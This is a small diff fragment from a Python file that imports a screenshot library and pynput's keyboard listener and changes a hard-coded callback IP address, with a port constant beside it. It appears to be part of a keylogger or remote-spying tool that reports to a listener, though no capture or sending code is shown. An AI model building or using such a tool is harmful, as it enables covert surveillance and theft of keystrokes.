@@ -16,7 +16,7 @@ import pyscreenshot
 from datetime import datetime
 from pynput.keyboard import Key, Listener
 
-CONSTIP = "192.168.225.178" #Change IP
+CONSTIP = "192.168.225.135" # Change IP
 CONSTPT = 2021 # Change Port 
 
 
